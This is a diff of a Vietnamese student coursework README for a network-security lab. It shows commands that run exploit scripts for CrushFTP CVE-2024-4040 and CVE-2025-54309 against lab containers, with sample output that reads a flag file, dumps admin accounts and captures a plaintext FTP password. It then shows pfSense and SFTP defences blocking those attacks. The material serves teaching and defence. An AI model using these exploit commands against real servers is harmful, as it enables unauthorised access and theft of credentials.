+  Máy chủ trả về nội dung cờ bí mật: **`NHOM05-CVE4040-LAB-ONLY`**.
 
-Bằng kỹ thuật gửi liên tục các yêu cầu đồng thời (*burst concurrent requests*) trong khoảng thời gian cực ngắn ($<10\,\text{ms}$), luồng xử lý xác thực bị xung đột tài nguyên, dẫn đến việc engine cấp phát phiên quản trị rỗng (Admin Session) cho máy kiểm thử. Kẻ tấn công sử dụng session này để gọi API nội bộ, trích xuất thành công toàn bộ danh sách tài khoản (`crushadmin`, `default`, `TempAccount`) mà không cần cung cấp mật khẩu quản trị.
-
----
-
-### 3.4. Lý thuyết Cơ chế Phòng thủ Tường lửa pfSense & Phân vùng Mạng
-
-#### A. Phân vùng mạng và cô lập Broadcast Domain:
-* Đặt tường lửa pfSense làm ranh giới giữa hai phân đoạn mạng độc lập: Vùng mạng ngoài **WAN (`10.10.10.0/24`)** và Vùng mạng nội bộ **LAN (`10.10.20.0/24`)**.
-* Tường lửa cắt đứt miền quảng bá (*Broadcast Domain*), ngăn chặn hoàn toàn việc một máy ở vùng WAN có thể nghe lén (*Sniffing*) các gói tin truyền tải nội bộ trong LAN.
-
-#### B. Cơ chế Drop cổng 8080 (`bat_phong_thu`):
-* Bình thường, pfSense thực hiện NAT Port Forwarding: `WAN:8080 -> 10.10.20.20:8080` để cho phép truy cập WebInterface.
-* Khi kích hoạt `bat_phong_thu.bat`, quy tắc chuyển tiếp hoặc luật cho phép trên cổng 8080 lập tức bị hủy bỏ/DROP. Toàn bộ các gói tin TCP SYN gửi tới cổng 8080 từ WAN đều bị tường lửa âm thầm loại bỏ.
-* **Kết quả:** Kẻ tấn công từ ngoài WAN bị lỗi `ConnectTimeout`, không thể chạm tới endpoint `/WebInterface/function/`, qua đó vô hiệu hóa hoàn toàn nguy cơ khai thác CVE-2024-4040 và CVE-2025-54309 từ xa.
+#### 2. Lỗ hổng CVE-2025-54309 (Race Condition AS2 Authentication Bypass)
+* **Nguyên nhân gốc rễ:** Giao thức AS2 được dùng để trao đổi chứng từ điện tử qua HTTPS. Khi cấu hình CrushFTP đứng trực tiếp mà không có tầng DMZ Proxy bảo vệ, logic gán quyền phiên làm việc (*Session Context Binding*) xuất hiện điều kiện tương tranh (Race Condition).
+* **Kết quả khai thác:** Kẻ tấn công phát chuỗi burst request đồng thời trong thời gian cực ngắn ($<10\,\text{ms}$) làm xung đột tài nguyên, khiến máy chủ cấp phát phiên làm việc với đặc quyền Admin rỗng. Từ session này, kẻ tấn công gọi API nội bộ và trích xuất thành công danh sách người dùng quản trị: `crushadmin`, `default`, `TempAccount`.
 
 ---
 
-## 4. Tải Tệp Ảnh Môi trường Thực nghiệm (.tar)
+### 5.3. Giải pháp Phòng thủ Đa tầng & Kết quả Thực nghiệm Đối chiếu
 
-Tải các gói ảnh Docker đóng gói sẵn tại mục **[Releases](https://github.com/Snoopyz1/BTL_ATM/releases)**:
-* **`nhom05_atm_lab_final.tar`** (~434 MB - **Khuyên dùng**): Gồm trọn vẹn 3 node (`firewall_pfsense`, `victim_server`, `attacker_kali` có sẵn các script exploit và file cờ bí mật). Khởi chạy **hoàn toàn Offline**, không cần Internet.
-* **`nhom05_atm_lab.tar`** (~448 MB): Gói 2 node cơ bản (Ubuntu CrushFTP và Kali Attacker).
+Dự án đã triển khai và chứng minh tính hiệu quả của chiến lược phòng thủ phối hợp:
+
+```
+[Mạng Ngoài WAN]
+       │
+       ▼
+┌────────────────────────────────────────────────────────┐
+│  LỚP 1: TƯỜNG LỬA TRUNG TÂM (PFSENSE)                   │
+│  - Phân vùng mạng độc lập, cô lập Broadcast Domain     │
+│  - Cơ chế Drop cổng 8080 (bat_phong_thu) chặn đứng SYN │
+└────────────────────────────────────────────────────────┘
+       │
+       ▼
+┌────────────────────────────────────────────────────────┐
+│  LỚP 2: MÃ HÓA KÊNH TRUYỀN (FTPS / SFTP)                │
+│  - Chuyển toàn bộ luồng truyền tệp sang SSH Port 22    │
+│  - Vô hiệu hóa nguy cơ bắt trộm dữ liệu qua Wireshark  │
+└────────────────────────────────────────────────────────┘
+```
+
+#### Bảng tổng hợp đối chiếu kết quả Trước và Sau phòng thủ
+
+| Kịch bản Kiểm thử | Giai đoạn 1: Chưa bật phòng thủ (Mạng phẳng / Không mã hóa) | Giai đoạn 2: Kích hoạt phòng thủ (pfSense Drop 8080 + SFTP) | Đánh giá Mức độ An toàn |
+| :--- | :--- | :--- | :--- |
+| **Bắt gói tin FTP tìm mật khẩu** | ❌ Lộ rõ `USER crushadmin` / `PASS admin123` | ✔️ Dữ liệu được mã hóa hoàn toàn qua SFTP / SSHv2 | Triệt tiêu hoàn toàn nguy cơ Sniffing |
+| **Trích xuất nội dung tệp tin** | ❌ Đọc nguyên vẹn nội dung file `mau.txt` | ✔️ Tải trọng hiển thị dạng nhị phân mã hóa vô nghĩa | Đảm bảo 100% tính bảo mật dữ liệu |
+| **Khai thác SSTI CVE-2024-4040** | ❌ Thành công: Đọc được cờ bí mật trên OS | ✔️ Thất bại: Gói tin bị pfSense DROP $\rightarrow$ `ConnectTimeout` | Ngăn chặn kẻ tấn công chạm vào ứng dụng |
+| **Khai thác AS2 CVE-2025-54309** | ❌ Thành công: Trích xuất toàn bộ user Admin | ✔️ Thất bại: Không thể kết nối tới WebInterface cổng 8080 | Bảo vệ tuyệt đối quyền quản trị hệ thống |
+| **Nghe lén lưu lượng vùng LAN** | ❌ Bắt được gói tin của toàn bộ mạng | ✔️ pfSense cô lập Broadcast, ngoài WAN không thấy gì | Ngăn chặn hiện tượng tràn lưu lượng nội bộ |
 
 ---
 
-## 5. Hướng dẫn Khởi chạy Lab Thực nghiệm (Docker & VMware)
+## 6. Hướng dẫn Khởi chạy Lab Thực nghiệm (Docker & VMware)
 
-### Cách 1: Khởi chạy bằng Docker Compose (Khuyên dùng)
+### Cách 1: Khởi chạy nhanh bằng Docker Compose (Khuyên dùng)
+Tải ảnh đóng gói sẵn tại mục [Releases](https://github.com/Snoopyz1/BTL_ATM/releases): `nhom05_atm_lab_final.tar`.
 
-Mở PowerShell / Command Prompt tại thư mục `kich_ban_lab_docker`:
-
-**Bước 1: Nạp ảnh Docker vào hệ thống (chỉ cần làm 1 lần):**
+Mở PowerShell tại thư mục `kich_ban_lab_docker`:
 ```powershell
+# 1. Nạp ảnh Docker (chỉ làm 1 lần)
 docker load -i nhom05_atm_lab_final.tar
-```
 
-**Bước 2: Khởi động hệ thống 3 node:**
-```powershell
+# 2. Khởi động toàn bộ 3 máy container
 docker compose up -d
 ```
-
 * Mở trình duyệt kiểm tra máy chủ: `http://localhost:8080` (Tài khoản: `crushadmin` / Mật khẩu: `admin123`).
-* Cả 3 container tự động kết nối thông qua router tường lửa ảo `firewall_pfsense`.
+
+### Cách 2: Triển khai trên VMware Workstation
+Xem hướng dẫn chi tiết tại [README_VMWARE_PFSENSE.md](kich_ban_lab_vmware_pfsense/README_VMWARE_PFSENSE.md). Cấu hình 2 mạng Host-only (`VMnet2` và `VMnet3`), sau đó import file cấu hình `pfSense_Config_Backup_Nhom05.xml` trên WebGUI pfSense (`https://10.10.20.1`).
 
 ---
 
-### Cách 2: Khởi chạy trên VMware Workstation (pfSense thật)
-
-Xem hướng dẫn chi tiết tại [README_VMWARE_PFSENSE.md](file:///d:/PTIT/ATM/BTL/BTL_ATM_Final_Nhom05/kich_ban_lab_vmware_pfsense/README_VMWARE_PFSENSE.md):
-1. Cấu hình Virtual Network Editor: `VMnet2` (`10.10.10.0/24`) và `VMnet3` (`10.10.20.0/24`).
-2. Gán máy ảo pfSense: Card 1 nối `VMnet2` (WAN), Card 2 nối `VMnet3` (LAN).
-3. Import cấu hình bằng file `pfSense_Config_Backup_Nhom05.xml` trên WebGUI của pfSense (`https://10.10.20.1`).
-
----
-
-## 6. Kịch bản Thực nghiệm và Demo Đối chiếu (2 Giai đoạn)
+## 7. Kịch bản Demo Thực nghiệm Đối chiếu (2 Giai đoạn)
 
 ### Giai đoạn 1: Khi chưa bật phòng thủ (Tấn công thành công)
+Mở terminal tại `kich_ban_lab_docker`:
 
-Thực hiện các lệnh sau trên terminal tại thư mục `kich_ban_lab_docker`:
+1. **Khai thác CVE-2024-4040 đọc cờ bí mật:**
+   ```powershell
+   docker exec -it attacker_kali python3 /root/exploits/read_file_CVE_2024_4040.py http://10.10.10.128:8080 /var/tmp/nhom05-cve4040.txt
+   ```
+   > *Kết quả:* Đọc thành công cờ bí mật: `NHOM05-CVE4040-LAB-ONLY`.
 
-#### 1. Khai thác CVE-2024-4040 — Đọc file cờ bí mật:
-Kẻ tấn công từ máy `attacker_kali` gửi payload SSTI không cần xác thực tới cổng 8080 nhằm đọc tệp `/var/tmp/nhom05-cve4040.txt`:
-```powershell
-docker exec -it attacker_kali python3 /root/exploits/read_file_CVE_2024_4040.py http://10.10.10.128:8080 /var/tmp/nhom05-cve4040.txt
-```
-> **Kết quả thực nghiệm:**
-> ```
-> [+] Target URL: http://10.10.10.128:8080
-> [+] Target File: /var/tmp/nhom05-cve4040.txt
-> [+] Obtaining anonymous session... CrushAuth=1730... c2f=xxxx
-> [+] Sending SSTI exploit payload via exists command...
-> [!] VULNERABLE! File content retrieved successfully:
-> --------------------------------------------------
-> NHOM05-CVE4040-LAB-ONLY
-> --------------------------------------------------
-> ```
-> *Kẻ tấn công đọc thành công cờ bí mật nằm trên hệ điều hành máy chủ.*
-
-#### 2. Khai thác CVE-2025-54309 — Chiếm phiên và trích xuất tài khoản quản trị:
-Kẻ tấn công lợi dụng Race Condition trên endpoint AS2 để lấy quyền quản trị:
-```powershell
-docker exec -it attacker_kali python3 /root/exploits/attack_CVE_2025_54309.py http://10.10.10.128:8080
-```
-> **Kết quả thực nghiệm:**
-> ```
-> [+] Starting race condition exploit against http://10.10.10.128:8080...
-> [+] Triggering concurrent requests to AS2 handler...
-> [+] Authentication Bypass SUCCESSFUL! Captured Admin Session.
-> [+] Dumping user list from CrushFTP engine:
->     - User 1: crushadmin (Admin)
->     - User 2: default (Template)
->     - User 3: TempAccount (Standard)
-> ```
-> *Kẻ tấn công trích xuất toàn bộ danh sách tài khoản quản trị mà không cần đăng nhập.*
-
-#### 3. Bắt gói tin FTP bản rõ bằng Wireshark / tcpdump:
-* Khi truyền nhận file qua FTP cổng 21, Wireshark bắt được trọn vẹn thông tin đăng nhập: `USER crushadmin` / `PASS admin123`.
-* Sử dụng Follow TCP Stream có thể tái tạo nguyên vẹn nội dung file `mau.txt`.
+2. **Khai thác CVE-2025-54309 chiếm phiên quản trị:**
+   ```powershell
+   docker exec -it attacker_kali python3 /root/exploits/attack_CVE_2025_54309.py http://10.10.10.128:8080
+   ```
+   > *Kết quả:* Vượt qua xác thực và trích xuất danh sách tài khoản: `crushadmin`, `default`, `TempAccount`.
 
 ---
 
-### Giai đoạn 2: Kích hoạt phòng thủ pfSense & Mã hóa (Chặn đứng tấn công)
+### Giai đoạn 2: Kích hoạt phòng thủ pfSense (Tấn công bị chặn đứng)
 
-#### 1. Bật luật tường lửa pfSense chặn truy cập cổng 8080 từ WAN:
-```powershell
-.\bat_phong_thu.bat
-```
-*(Hoặc chạy `.\bat_phong_thu.ps1` nếu dùng PowerShell)*.
+1. **Bật luật tường lửa pfSense Drop cổng 8080:**
+   ```powershell
+   .\bat_phong_thu.bat
+   ```
 
-pfSense lập tức hủy bỏ luồng chuyển tiếp cổng 8080 từ ngoài WAN vào máy chủ CrushFTP.
+2. **Kẻ tấn công thực thi lại CVE-2024-4040:**
+   ```powershell
+   docker exec -it attacker_kali python3 /root/exploits/read_file_CVE_2024_4040.py http://10.10.10.128:8080 /var/tmp/nhom05-cve4040.txt
+   ```
+   > *Kết quả:* Báo lỗi `ConnectTimeout` sau 10 giây. Tường lửa pfSense đã DROP gói tin, **kẻ tấn công hoàn toàn không thể lấy được file cờ**.
 
-#### 2. Kẻ tấn công thực thi lại CVE-2024-4040:
-```powershell
-docker exec -it attacker_kali python3 /root/exploits/read_file_CVE_2024_4040.py http://10.10.10.128:8080 /var/tmp/nhom05-cve4040.txt
-```
-> **Kết quả thực nghiệm:**
-> ```
-> [-] Connecting to http://10.10.10.128:8080...
-> [-] Connection timed out after 10 seconds!
-> [-] Error: requests.exceptions.ConnectTimeout
-> ```
-> *pfSense DROP toàn bộ gói tin SYN. Kẻ tấn công **hoàn toàn KHÔNG THỂ lấy được file cờ bí mật**.*
+3. **Kẻ tấn công thực thi lại CVE-2025-54309:**
+   ```powershell
+   docker exec -it attacker_kali python3 /root/exploits/attack_CVE_2025_54309.py http://10.10.10.128:8080
+   ```
+   > *Kết quả:* Báo lỗi `ConnectTimeout`. Cuộc tấn công bị chặn đứng hoàn toàn.
 
-#### 3. Kẻ tấn công thực thi lại CVE-2025-54309:
-```powershell
-docker exec -it attacker_kali python3 /root/exploits/attack_CVE_2025_54309.py http://10.10.10.128:8080
-```
-> **Kết quả thực nghiệm:**
-> ```
-> [-] Connecting to http://10.10.10.128:8080...
-> [-] Failed to establish connection: ConnectTimeout. Cuộc tấn công bị chặn đứng hoàn toàn!
-> ```
-
-#### 4. Kiểm chứng phân vùng mạng — Chống nghe lén (Sniffing) từ vùng ngoài:
-Kiểm tra khả năng bắt trộm gói tin nội bộ từ máy kiểm thử ở vùng WAN:
-```powershell
-docker exec -it attacker_kali tcpdump -i eth0 -n -c 5
-```
-> **Kết quả thực nghiệm:** Máy `attacker_kali` ở vùng WAN hoàn toàn không nhận được bất kỳ bản tin nào từ luồng truyền dữ liệu nội bộ trong mạng LAN. Tường lửa pfSense đã cô lập hoàn toàn miền quảng bá.
-
-#### 5. Kiểm chứng mã hóa bằng FTPS / SFTP:
-* Chuyển kết nối truyền tệp sang SFTP (cổng TCP 22): Toàn bộ gói tin được mã hóa SSHv2.
-* Trên Wireshark, toàn bộ Payload hiển thị dưới dạng byte nhị phân mã hóa ngẫu nhiên, bảo vệ tuyệt đối dữ liệu.
+4. **Kiểm chứng chống nghe lén bằng phân vùng mạng:**
+   ```powershell
+   docker exec -it attacker_kali tcpdump -i eth0 -n -c 5
+   ```
+   > *Kết quả:* Máy ngoài WAN hoàn toàn không nhận được gói tin nào của mạng nội bộ LAN.
 
 ---
 
-### Bảng tổng hợp đối chiếu kết quả Trước và Sau phòng thủ
+## 8. Bài học Kinh nghiệm & Hướng Phát triển
 
-| Mục tiêu kiểm thử | Trước khi bật phòng thủ (Mạng phẳng / Không mã hóa) | Sau khi bật phòng thủ (pfSense + FTPS/SFTP) | Đánh giá hiệu quả |
-| :--- | :--- | :--- | :--- |
-| **Bảo vệ mật khẩu đăng nhập** | ❌ Lộ bản rõ (`admin123`) trên cổng TCP 21 | ✔️ Mã hóa hoàn toàn qua TLS / SSH Key | Ngăn chặn triệt để tấn công nghe lén (Sniffing) |
-| **Bảo vệ nội dung tệp tin** | ❌ Tệp `mau.txt` bị phục hồi nguyên vẹn | ✔️ Tải trọng mã hóa đối xứng AES mạnh | Đảm bảo 100% tính bí mật của dữ liệu |
-| **Lỗ hổng CVE-2024-4040** | ❌ Bị khai thác: Lấy được file cờ bí mật | ✔️ Bị chặn: pfSense Drop kết nối (Timeout) | Triệt tiêu khả năng truy cập vào endpoint lỗi |
-| **Lỗ hổng CVE-2025-54309** | ❌ Bị khai thác: Lộ toàn bộ tài khoản Admin | ✔️ Bị chặn: Không thể gửi payload Race Condition | Bảo vệ an toàn quyền quản trị máy chủ |
-| **Khả năng nghe lén vùng LAN** | ❌ Nghe lén được toàn bộ luồng mạng | ✔️ Bị cô lập hoàn toàn giữa 2 phân đoạn mạng | Triệt tiêu nguy cơ rò rỉ dữ liệu qua mạng chia sẻ |
+### Bài học thực tiễn về An toàn Mạng
+1. **Triết lý Phòng thủ theo chiều sâu (Defense-in-Depth):** Bài tập lớn chứng minh rằng việc chỉ triển khai mã hóa đường truyền (FTPS/SFTP) là chưa đủ. Nếu giao diện quản trị Web còn chứa các lỗ hổng lập trình nghiêm trọng (như CVE-2024-4040), kẻ tấn công vẫn có thể chiếm toàn quyền kiểm soát máy chủ từ xa mà không cần bẻ khóa mật mã. An toàn hệ thống phải được đảm bảo đồng thời từ Tường lửa biên $\rightarrow$ Phân vùng mạng $\rightarrow$ Mã hóa giao vận $\rightarrow$ Quản lý bản vá ứng dụng.
+2. **Quy trình quản lý bản vá (Patch Management):** Các phần mềm thương mại luôn tiềm ẩn nguy cơ xuất hiện các lỗ hổng zero-day. Việc theo dõi các bản tin an ninh mạng và cập nhật kịp thời các bản vá từ nhà phát triển là nhiệm vụ sống còn của đội ngũ quản trị.
+3. **Nguyên tắc phân quyền tối thiểu (Least Privilege):** Cần giam giữ người dùng trong vùng an toàn (Chroot jail), cô lập phân vùng VFS và thiết lập quyền đọc/ghi nghiêm ngặt trên hệ điều hành.
 
----
-
-## 7. Dọn dẹp Tài nguyên
-
-* Muốn mở lại kết nối để tiếp tục thử nghiệm tấn công:
-  ```powershell
-  .\tat_phong_thu.bat
-  ```
-* Khi kết thúc buổi thực nghiệm:
-  ```powershell
-  docker compose down
-  ```
+### Hướng phát triển & Mở rộng
+* **Tích hợp hệ thống phát hiện/ngăn chặn xâm nhập (IDS/IPS):** Cài đặt và cấu hình gói Snort hoặc Suricata trực tiếp trên tường lửa pfSense để nhận diện và ngăn chặn tự động các mẫu tấn công SSTI ngay từ lớp gói tin biên.
+* **Triển khai Web Application Firewall (WAF):** Đặt cụm reverse proxy Nginx kết hợp ModSecurity hoặc Cloudflare WAF phía trước CrushFTP WebInterface để lọc bỏ triệt để các thẻ nguy hiểm (`<INCLUDE>`) trước khi yêu cầu đến máy chủ ứng dụng.
+* **Tăng cường cơ chế xác thực:** Nâng cấp toàn bộ dịch vụ SFTP sang phương thức xác thực bằng cặp khóa công khai / khóa bí mật (SSH Key-based Authentication) kết hợp xác thực đa yếu tố (MFA).
 
 ---
 
-## 8. Tài liệu Tham khảo
+## 9. Tài liệu Tham khảo Chính
 
-1. **J. Postel and J. Reynolds**, *File Transfer Protocol (FTP)*, RFC 959, 1985.
-2. **P. Ford-Hutchinson**, *Securing FTP with TLS*, RFC 4217, 2005.
-3. **T. Ylonen and C. Lonvick**, *The Secure Shell (SSH) Transport Layer Protocol*, RFC 4253, 2006.
-4. **Rapid7 Research Team**, *CVE-2024-4040: CrushFTP Unauthenticated Remote Code Execution Analysis*, Rapid7 Blog, 2024.
-5. **watchTowr Labs**, *CrushFTP Authentication Bypass and Race Condition Analysis (CVE-2025-54309)*, Technical Advisory, 2025.
-6. **Netgate**, *pfSense Plus and Community Edition Documentation: Firewall Rule Methodology & NAT Configurations*, Netgate Docs, 2024.
+1. **J. Postel and J. Reynolds**, *File Transfer Protocol (FTP)*, RFC 959, Internet Engineering Task Force (IETF), 1985.
+2. **P. Ford-Hutchinson**, *Securing FTP with TLS*, RFC 4217, Internet Engineering Task Force (IETF), 2005.
+3. **T. Ylonen and C. Lonvick**, *The Secure Shell (SSH) Transport Layer Protocol*, RFC 4253, IETF, 2006.
+4. **M. Allman and S. Ostermann**, *FTP Security Considerations*, RFC 2577, IETF, 1999.
+5. **Rapid7 Research Team**, *CVE-2024-4040: CrushFTP Unauthenticated Remote Code Execution Analysis*, Rapid7 Blog & Vulnerability Database, 2024.
+6. **watchTowr Labs**, *CrushFTP Authentication Bypass and Race Condition Analysis (CVE-2025-54309)*, Technical Advisory, 2025.
+7. **Netgate**, *pfSense Plus and Community Edition Documentation: Firewall Rule Methodology & NAT Configurations*, Netgate Docs, 2024.
+8. **CrushFTP Inc.**, *CrushFTP Version 10 & 11 Security Advisories and Patches*, Official Documentation, 2024–2025.
+9. **Wireshark Foundation**, *Wireshark User's Guide: Analyzing TCP and Encrypted Application Protocols*, 2024.
+
+---
+
+<p align="center">
+  <i>Báo cáo Bài tập lớn Môn An toàn mạng (INT1482) — Nhóm 05 — PTIT 2025-2026</i>
+</p>
